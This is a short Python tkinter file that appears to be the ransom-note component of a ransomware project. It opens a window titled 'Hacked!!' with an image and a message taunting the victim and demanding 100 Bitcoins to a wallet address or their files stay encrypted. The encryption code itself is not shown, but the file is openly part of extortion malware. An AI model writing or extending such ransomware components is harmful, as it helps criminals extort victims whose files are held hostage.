import tkinter
from tkinter.ttk import *
from tkinter import Tk
from PIL import ImageTk, Image
import threading

class App(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.start()

    def callback(self):
        self.root.quit()

    payment = ""
    def pop_up_win(self):

        self.root = Tk()
        self.root.protocol("WM_DELETE_WINDOW", self.callback)
        self.root.title = "Hacked!!"
    
        self.root.geometry("1000x1000")

        frame = Frame(self.root, width=100, height=100)
        frame.pack()
        frame.place(anchor='center', relx=0.5, rely=0.5)

        # Create an object of tkinter ImageTk
        img = ImageTk.PhotoImage(Image.open("images/hacked_img.jpg"))

        # Create a Label Widget to display the text or Image
        label = Label(frame, image = img)
        label.pack()
        message = "                             Nice Day to get hacked huh? Poor you!\n"
        message += "Send 100 Bitcoins to the wallet address mentioned below or your files remain encrypted;)\n"
        message += "                             Wallet Address: BFJKAKFHAksbdfbkjab"

        l = Label(self.root, text = message)
        l.config(font =("Courier", 14))
        l.pack()

        self.root.mainloop()